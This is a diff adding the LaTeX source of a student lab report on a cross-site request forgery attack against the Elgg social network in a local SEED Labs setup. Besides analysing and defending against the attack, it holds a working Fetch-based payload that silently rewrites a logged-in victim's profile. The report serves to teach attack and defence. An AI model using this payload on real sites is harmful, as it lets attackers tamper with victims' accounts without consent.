@@ -1,0 +1,351 @@
+% =====================================================================
+%  REPORT — CSRF attack on Elgg via Fetch API (English)
+%  Compile: xelatex report_en.tex  (run 2-3x for the table of contents)
+% =====================================================================
+\documentclass[11pt,a4paper]{article}
+
+\usepackage{fontspec}
+\setmainfont{TeX Gyre Termes}
+\setsansfont{TeX Gyre Heros}
+\setmonofont{Noto Sans Mono}[Scale=0.86]
+
+\usepackage[english]{babel}
+
+\usepackage[a4paper,margin=2.4cm,headheight=15pt]{geometry}
+\input{sty_common}
+
+\usepackage{fancyhdr}
+\usepackage{titlesec}
+\usepackage{lastpage}
+\usepackage{hyperref}
+\hypersetup{colorlinks=true,linkcolor=accent,urlcolor=accent,citecolor=accent,
+  pdftitle={CSRF attack on Elgg via Fetch API},
+  pdfauthor={Group 3 - Information Systems Security}}
+
+\titleformat{\section}{\sffamily\Large\bfseries\color{navy}}{\thesection.}{0.6em}{}[{\color{line}\titlerule[1pt]}]
+\titleformat{\subsection}{\sffamily\large\bfseries\color{brandblue}}{\thesubsection}{0.6em}{}
+\titleformat{\subsubsection}{\sffamily\normalsize\bfseries\color{ink}}{\thesubsubsection}{0.6em}{}
+\titlespacing*{\section}{0pt}{16pt}{8pt}
+
+\pagestyle{fancy}
+\fancyhf{}
+\fancyhead[L]{\footnotesize\sffamily\color{slate}CSRF on Elgg · Fetch API}
+\fancyhead[R]{\footnotesize\sffamily\color{slate}Information Systems Security}
+\fancyfoot[C]{\footnotesize\sffamily\color{slate}Page \thepage{} / \pageref{LastPage}}
+\renewcommand{\headrulewidth}{0.4pt}
+\renewcommand{\headrule}{\hbox to\headwidth{\color{line}\leaders\hrule height \headrulewidth\hfill}}
+
+% ---- English labels for the sequence diagram (defined before \input) ----
+\newcommand{\lblVictim}{Alice (victim) + Browser}
+\newcommand{\lblAttacker}{Attacker\\\texttt{attacker32.com}}
+\newcommand{\lblElgg}{Elgg\\\texttt{seed-server.com}}
+\newcommand{\lblSa}{1. Legitimate login}
+\newcommand{\lblSb}{2. Set-Cookie \texttt{Elgg=...}}
+\newcommand{\lblSc}{3. Unknowingly opens malicious page}
+\newcommand{\lblSd}{4. Returns \texttt{index.html} (Fetch script)}
+\newcommand{\lblNe}{5. Script auto-runs (\texttt{DOMContentLoaded})}
+\newcommand{\lblSf}{6. Fetch POST + cookie (\texttt{credentials:'include'})}
+\newcommand{\lblNg}{7. Valid cookie $\Rightarrow$ update About me}
+\newcommand{\lblSh}{8. Response 302 (opaque)}
+\newcommand{\lblSi}{9. Re-check profile $\to$ changed}
+\input{diagram_flow}
+
+\begin{document}
+
+% =====================================================================
+%  TITLE PAGE
+% =====================================================================
+\begin{titlepage}
+\begin{tikzpicture}[remember picture,overlay]
+  \fill[navy] (current page.north west) rectangle ([yshift=-5.2cm]current page.north east);
+  \fill[brandblue] ([yshift=-5.2cm]current page.north west) rectangle ([yshift=-5.7cm]current page.north east);
+  \node[anchor=north west,text=white,font=\sffamily\small] at ([xshift=2.4cm,yshift=-1.1cm]current page.north west)
+     {VNU — UNIVERSITY OF SCIENCE};
+  \node[anchor=north west,text=white,font=\sffamily\small] at ([xshift=2.4cm,yshift=-1.7cm]current page.north west)
+     {Course: Information Systems Security};
+  \node[anchor=north west,text=white,font=\sffamily\bfseries\LARGE,text width=16cm] at ([xshift=2.4cm,yshift=-3.0cm]current page.north west)
+     {Lab Report};
+  \node[anchor=north west,text=mist,font=\sffamily\large,text width=16cm] at ([xshift=2.4cm,yshift=-4.2cm]current page.north west)
+     {Cross-Site Request Forgery (CSRF) attack};
+\end{tikzpicture}
+
+\vspace*{6.2cm}
+{\sffamily
+\begin{flushleft}
+{\color{slate}\large TOPIC}\\[4pt]
+{\color{navy}\bfseries\Huge CSRF attack on the Elgg\\[6pt] social network using Fetch API}\\[14pt]
+{\color{ink}\large Replacing XMLHttpRequest / form submit with \texttt{fetch()} + \texttt{URLSearchParams} / \texttt{FormData}}
+\end{flushleft}}
+
+\vfill
+{\sffamily\normalsize
+\begin{tcolorbox}[colback=mist,colframe=line,boxrule=0.6pt,arc=3pt]
+\begin{tabularx}{\linewidth}{@{}l Y@{}}
+\textbf{Group} & Group 3 (3 members)\\[3pt]
+\textbf{Member 1} & \underline{\hspace{4.2cm}} — ID: \underline{\hspace{3cm}} \quad (Technical / Offensive Lead)\\[3pt]
+\textbf{Member 2} & \underline{\hspace{4.2cm}} — ID: \underline{\hspace{3cm}} \quad (Browser \& Defense Lead)\\[3pt]
+\textbf{Member 3} & \underline{\hspace{4.2cm}} — ID: \underline{\hspace{3cm}} \quad (Research \& Slides Lead)\\[3pt]
+\textbf{Instructor} & \underline{\hspace{6cm}}\\[3pt]
+\textbf{Date} & \today\\
+\end{tabularx}
+\end{tcolorbox}}
+
+\begin{center}\footnotesize\color{slate}
+\textbf{Ethics notice:} All work is for learning purposes only, inside a local SEED Labs (Docker) environment — not aimed at any real person or organization.
+\end{center}
+\end{titlepage}
+
+% =====================================================================
+\begin{abstract}
+\noindent This report presents the study and practical exploitation of a \textbf{Cross-Site Request Forgery (CSRF)} vulnerability on the open-source social network \textbf{Elgg} within the SEED Labs environment. The key improvement over the original lab is replacing \texttt{XMLHttpRequest} and the \texttt{form submit} mechanism entirely with the modern \textbf{Fetch API} combined with \texttt{URLSearchParams} or \texttt{FormData}. The exploitation goal is to change the victim's \emph{About me} profile field into the string \texttt{CSRF attack by <ID>}. We analyse the HTTP request, explain the core mechanisms (\texttt{credentials: 'include'}, Simple Request, \texttt{mode: 'no-cors'}), illustrate the attack-flow sequence diagram, verify the result and — most importantly — demonstrate the effectiveness of defensive measures (SameSite cookie, anti-CSRF token, \texttt{Origin} checking). The report concludes with answers to 15 theory questions and an AI-usage disclosure.
+\end{abstract}
+
+{\hypersetup{linkcolor=ink}\tableofcontents}
+\newpage
+
+% =====================================================================
+\section{Introduction and objectives}
+\subsection{Context}
+CSRF is a web application-layer vulnerability that exploits the browser's \emph{implicit trust}: when sending a request to a domain, the browser automatically attaches all cookies belonging to that domain — including the authentication session cookie. An attacker abuses this to make a logged-in victim's browser send a state-changing request the victim never intended.
+
+\subsection{Objectives}
+\begin{itemize}
+  \item \textbf{Target system:} Elgg running on SEED Labs containers (Apache at \texttt{www.seed-server.com}, MySQL, Attacker at \texttt{www.attacker32.com}).
+  \item \textbf{Exploit action:} from the Attacker server, forge an HTTP POST to the endpoint \texttt{/action/profile/edit} to change the victim's \emph{About me} field into \texttt{CSRF attack by <ID>}.
+  \item \textbf{Mandatory technical constraints:}
+  \begin{enumerate}
+    \item \no{} No \texttt{XMLHttpRequest}.
+    \item \no{} No self-submitting \texttt{<form>} (causes redirection, reveals the attack).
+    \item \yes{} Must use \textbf{Fetch API} + \texttt{URLSearchParams} or \texttt{FormData}.
+  \end{enumerate}
+\end{itemize}
+
+\begin{warnbox}[Scope \& ethics]
+Everything is performed only in a local lab owned by the group. Applying these techniques to any unauthorized system violates the law and academic rules. The sole purpose is to \emph{learn attacks in order to defend}.
+\end{warnbox}
+
+% =====================================================================
+\section{CSRF background}
+\subsection{Three conditions for an attack}
+\begin{enumerate}
+  \item The victim has an \textbf{active session} (session cookie).
+  \item The target action \textbf{changes state} and has \textbf{predictable} parameters.
+  \item The application \textbf{lacks defenses} (no SameSite Strict/Lax, no anti-CSRF token).
+\end{enumerate}
+
+\subsection{Same-origin, same-site and the role of cookies}
+The browser distinguishes \emph{same-origin} (identical scheme + host + port) from \emph{cross-site} (different eTLD+1). The Same-Origin Policy (SOP) forbids one site's JavaScript from \emph{reading} another origin's content/response — but it does \textbf{not} forbid \emph{sending} requests. This "can send but cannot read" gap is the foundation of CSRF: the attacker does not need to read the result, only to have the state-changing action executed.
+
+% =====================================================================
+\section{Lab environment}
+\begin{lstlisting}[language=bash,caption={Starting the SEED Labs environment}]
+cd ~/Labsetup
+docker-compose up -d                 # seed-server, mysql, attacker32
+docker ps --format "table {{.Names}}\t{{.Status}}"
+\end{lstlisting}
+
+\begin{center}\small
+\begin{tabularx}{\linewidth}{@{}l l Y@{}}
+\toprule
+\textbf{Service} & \textbf{Address} & \textbf{Role}\\
+\midrule
+seed-server & 10.9.0.5 — \texttt{www.seed-server.com} & Apache + Elgg application (target)\\
+mysql       & 10.9.0.6 & Elgg user database\\
+attacker32  & 10.9.0.7 — \texttt{www.attacker32.com} & Attacker's web server\\
+\bottomrule
+\end{tabularx}
+\end{center}
+
+\noindent The victim's \texttt{/etc/hosts} maps the virtual domains to internal IPs \texttt{10.9.0.x}. Connectivity can be checked before the demo via \texttt{python3 src/exploit.py -{}-check}.
+
+% =====================================================================
+\section{HTTP request analysis with DevTools}
+To forge accurately, we first capture a legitimate request. Log in as Alice (\texttt{alice}/\texttt{seedalice}), open \emph{Edit Profile}, open \texttt{F12 → Network} (enable \emph{Preserve log}), change a field and click \textbf{Save}.
+
+\begin{lstlisting}[style=http,caption={POST request when saving the profile (trimmed)}]
+POST /action/profile/edit HTTP/1.1
+Host: www.seed-server.com
+Content-Type: application/x-www-form-urlencoded
+Cookie: Elgg=p0dci8baqrl4i2ipv2mio3po05; ...
+
+name=Alice&description=<p>I am Alice</p>&accesslevel[description]=2
+&briefdescription=...&guid=42
+\end{lstlisting}
+
+\begin{center}\small
+\begin{tabularx}{\linewidth}{@{}l Y l@{}}
+\toprule
+\textbf{Parameter} & \textbf{Meaning} & \textbf{Sample value}\\
+\midrule
+\texttt{guid} & Victim's unique id & \texttt{42}\\
+\texttt{name} & Display name & \texttt{Alice}\\
+\texttt{description} & \textbf{About me content} & \texttt{<p>CSRF attack by <ID></p>}\\
+\texttt{accesslevel[description]} & Visibility (2 = Public) & \texttt{2}\\
+\texttt{\_\_elgg\_token / \_\_elgg\_ts} & Anti-CSRF token & \emph{(disabled in Task 3)}\\
+\bottomrule
+\end{tabularx}
+\end{center}
+
+% =====================================================================
+\section{Exploitation with the Fetch API}
+\subsection{Comparing the three methods}
+\begin{center}\small
+\begin{tabularx}{\linewidth}{@{}Y C C C@{}}
+\toprule
+\textbf{Criterion} & \textbf{Form submit} & \textbf{XHR} & \textbf{Fetch API}\\
+\midrule
+Stealth (no page change) & \no & \yes & \yes\\
+Modern syntax (Promise/async) & \no & \no & \yes\\
+Allowed by the assignment & \no{} banned & \no{} banned & \yes{} required\\
+\bottomrule
+\end{tabularx}
+\end{center}
+
+\subsection{Two key mechanisms}
+\begin{infobox}[\texttt{credentials: 'include'} — sending cookies cross-origin]
+By default a cross-origin \texttt{fetch()} uses \texttt{credentials: 'same-origin'}, so it does \emph{not} send \texttt{seed-server.com} cookies. We must set \texttt{credentials: 'include'} so the browser attaches the victim's session cookie — without it the server treats the request as an anonymous guest and the attack fails.
+\end{infobox}
+
+\begin{infobox}[Simple Request + \texttt{mode: 'no-cors'} — bypassing Preflight]
+\texttt{Content-Type} of \texttt{application/x-www-form-urlencoded} (URLSearchParams) or \texttt{multipart/form-data} (FormData) are \emph{CORS-safelisted} $\Rightarrow$ this is a \textbf{Simple Request} with no Preflight \texttt{OPTIONS}. Even though SOP blocks JavaScript from \emph{reading} the (opaque) response, the Elgg server \emph{still} receives the valid cookie and overwrites the database successfully.
+\end{infobox}
+
+\subsection{Exploit code (URLSearchParams variant)}
+\begin{lstlisting}[language=JavaScript,caption={Attack core in src/index.html}]
+const payload = new URLSearchParams();
+payload.append('name', 'Alice');
+payload.append('description', '<p>CSRF attack by B21DCCN001</p>');
+payload.append('accesslevel[description]', '2');   // 2 = Public
+payload.append('guid', '42');                       // Alice's GUID
+
+fetch('http://www.seed-server.com/action/profile/edit', {
+  method: 'POST',
+  mode: 'no-cors',          // Simple Request -> no Preflight OPTIONS
+  credentials: 'include',   // REQUIRED: attach victim's session cookie
+  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+  body: payload
+});
+\end{lstlisting}
+
+\begin{infobox}[FormData variant]
+With \texttt{new FormData()}, do \textbf{not} set the \texttt{Content-Type} header manually so the browser can generate the \texttt{boundary}. See \texttt{src/index\_formdata.html}. Auto-generate with: \texttt{python3 src/exploit.py -{}-mode formdata}.
+\end{infobox}
+
+% =====================================================================
+\section{Attack flow diagram}
+\begin{center}
+\scalebox{0.92}{\csrfflowdiagram}
+\end{center}
+
+% =====================================================================
+\section{Experimental results}
+Three pieces of evidence to record (insert the group's real screenshots into the frames below):
+
+\begin{center}
+\begin{tabular}{@{}p{0.31\linewidth}p{0.31\linewidth}p{0.31\linewidth}@{}}
+\fbox{\parbox[c][3.2cm][c]{\linewidth}{\centering\footnotesize\color{slate}\textbf{Shot 1 — Before}\\[4pt]Alice's original About me}} &
+\fbox{\parbox[c][3.2cm][c]{\linewidth}{\centering\footnotesize\color{slate}\textbf{Shot 2 — During}\\[4pt]Attacker page F12 console: silent Fetch POST}} &
+\fbox{\parbox[c][3.2cm][c]{\linewidth}{\centering\footnotesize\color{slate}\textbf{Shot 3 — After}\\[4pt]About me = \texttt{CSRF attack by <ID>}}}\\
+\end{tabular}
+\end{center}
+
+\begin{okbox}[Result]
+After the victim visits the Attacker page, the About me field changes to \texttt{CSRF attack by <ID>} with no warning or redirection whatsoever — proving a fully successful exploit in the undefended configuration.
+\end{okbox}
+
+% =====================================================================
+\section{Verification and defense}
+\subsection{Re-enabling Elgg's anti-CSRF token}
+Restoring the \texttt{\_\_elgg\_token}/\texttt{\_\_elgg\_ts} check and re-running the same payload:
+
+\begin{center}\small
+\begin{tabularx}{\linewidth}{@{}Y C C@{}}
+\toprule
+ & \textbf{Defense OFF} & \textbf{Defense ON}\\
+\midrule
+Payload has \texttt{\_\_elgg\_token}? & No & Still no\\
+Server response & Updates DB (302) & \textbf{Rejected} (missing token)\\
+Alice's About me & Changed & \textbf{Unchanged}\\
+\bottomrule
+\end{tabularx}
+\end{center}
+
+\noindent Because SOP forbids \texttt{attacker32.com} JavaScript from reading the token on \texttt{seed-server.com}, the forged request always lacks a valid token $\Rightarrow$ it is blocked. This is direct evidence for the \emph{Synchronizer Token Pattern}.
+
+\subsection{Defense-in-Depth}
+\begin{center}\small
+\begin{tabularx}{\linewidth}{@{}l Y Y@{}}
+\toprule
+\textbf{Layer} & \textbf{Measure} & \textbf{What it blocks}\\
+\midrule
+Cookie & \texttt{SameSite=Lax/Strict} & Browser will not send cookies cross-site\\
+Application & Anti-CSRF token (Synchronizer) & Attacker cannot read the token (thanks to SOP)\\
+Application & Double Submit Cookie & Attacker cannot read the cookie to echo into the body\\
+Header & Check \texttt{Origin} / \texttt{Sec-Fetch-Site} & Reject state-changing requests from foreign origins\\
+UI & \texttt{X-Frame-Options} / CSP \texttt{frame-ancestors} & Prevent Clickjacking via iframe\\
+\bottomrule
+\end{tabularx}
+\end{center}
+
+\begin{infobox}[Practical recommendation]
+Combine \texttt{SameSite=Lax} (default layer) + anti-CSRF token (application layer) + \texttt{Origin} checks for sensitive endpoints. Never use \texttt{GET} for state-changing actions.
+\end{infobox}
+
+% =====================================================================
+\section{Task allocation}
+\begin{center}\small
+\begin{tabularx}{\linewidth}{@{}l Y@{}}
+\toprule
+\textbf{Member} & \textbf{Focus}\\
+\midrule
+M1 — Offensive & Docker, packet capture, \texttt{index.html} + \texttt{exploit.py} code; Q\&A 4–8\\
+M2 — Browser/Defense & Browser/CORS/SameSite analysis, recording \& editing the video; Q\&A 1,3,10–14\\
+M3 — Research/Slides & Slides, diagrams, report, defense verification; Q\&A 2,9,15\\
+\bottomrule
+\end{tabularx}
+\end{center}
+\noindent \textbf{Shared mandatory baseline (100\% of members):} each member runs Docker, captures the packet and changes About me to their own ID; all take part in a cross Q\&A session on the 15 questions.
+
+% =====================================================================
+\section{AI-usage disclosure}
+\begin{enumerate}
+  \item \textbf{Level 1 — Debate:} AI used to discuss \texttt{credentials: 'include'}, Simple Request and CORS; students wrote the code themselves.
+  \item \textbf{Level 2 — Co-creation:} students designed the report/slide/diagram structure; AI helped polish wording and formatting.
+  \item \textbf{Level 3 — Generation by prompt:} AI generated the \texttt{exploit.py} skeleton and HTML template; students configured real values and tested.
+\end{enumerate}
+\noindent The group takes full responsibility for all experimental results and their correctness.
+
+% =====================================================================
+\section{Conclusion}
+The group fully met the objective: changing About me to \texttt{CSRF attack by <ID>} using the Fetch API (no XHR/form), analysing the exploitation mechanism, verifying the result and demonstrating defense effectiveness. Core lesson: CSRF is not stopped by HTTPS; the fundamental countermeasure is \texttt{SameSite} cookies combined with anti-CSRF tokens and request-origin checks.
+
+% =====================================================================
+\appendix
+\section{Appendix: Answers to the 15 questions (summary)}
+\small
+\begin{enumerate}[leftmargin=2.2em]
+\item \textbf{SameSite prevents CSRF:} instructs the browser not to send cookies on cross-site requests (Strict/Lax) $\Rightarrow$ the forged request loses its authenticated session.
+\item \textbf{Secret token:} the server embeds a per-session random token in the form; thanks to SOP the attacker cannot read it $\Rightarrow$ a forged request without it is rejected.
+\item \textbf{HTTPS still at risk:} HTTPS only secures transport; cookies are still attached inside the TLS tunnel, so CSRF (an application-layer flaw) is not prevented.
+\item \textbf{GET \texttt{delete.php?pageid=5}:} use a hidden \texttt{<img src=...>} or \texttt{fetch(...,\{credentials:'include'\})} to trigger the forged GET.
+\item \textbf{POST \texttt{delete.php}:} use Fetch + \texttt{URLSearchParams(pageid=5)}, running silently with no page change.
+\item \textbf{Finding Boby's guid:} via the profile URL, the avatar \texttt{src}, the Add-friend link, or the RSS feed — all public.
+\item \textbf{Unknown user id:} depends on the server — if identity is derived from the session the attack still works; if a large random id is required in the body, it does not.
+\item \textbf{Attacking any visitor:} (1) \no{} edit profile — needs the victim's guid which SOP forbids reading; (2) \yes{} add friend — only needs Alice's own guid; the victim's identity comes from the session.
+\item \textbf{Session id in the data part (Double Submit):} the cookie is sent automatically, but the data part must be set by the origin site's JS; the attacker cannot read the cookie to set it correctly $\Rightarrow$ the server detects a cross-site request.
+\item \textbf{Does the browser know cross-site?} Yes — it knows the source and target origins and sends \texttt{Origin}, \texttt{Sec-Fetch-Site}.
+\item \textbf{Does the server know cross-site?} Not from plain HTTP by default; it can if it checks \texttt{Origin}/\texttt{Referer}/\texttt{Sec-Fetch-Site}/token.
+\item \textbf{Why not rely on Referer:} it can be legitimately absent (\texttt{Referrer-Policy}, HTTPS→HTTP, proxies) and is easily bypassed by loose regex checks.
+\item \textbf{Why knowing cross-site matters:} to allow state-changing actions only when the user truly intends them, preventing privilege abuse.
+\item \textbf{Ban all cross-site cookies?} Technically possible but it breaks navigation, SSO/OAuth and embedded widgets; the solution is the \texttt{SameSite=Lax} default.
+\item \textbf{Facebook iframe:} a request from inside the iframe to Facebook is same-site \emph{for Facebook} (not cross-site); the risk is Clickjacking; secure it with \texttt{X-Frame-Options} / CSP \texttt{frame-ancestors}.
+\end{enumerate}
+
+\begin{thebibliography}{9}\small
+\bibitem{du} W. Du, \emph{Computer \& Internet Security: A Hands-on Approach}, 3rd ed.
+\bibitem{fetch} WHATWG, \emph{Fetch Living Standard}, \url{https://fetch.spec.whatwg.org/}.
+\bibitem{owasp} OWASP, \emph{Cross-Site Request Forgery Prevention Cheat Sheet}.
+\bibitem{samesite} IETF, \emph{RFC 6265bis — Cookies: SameSite attribute}.
+\end{thebibliography}
+
+\end{document}
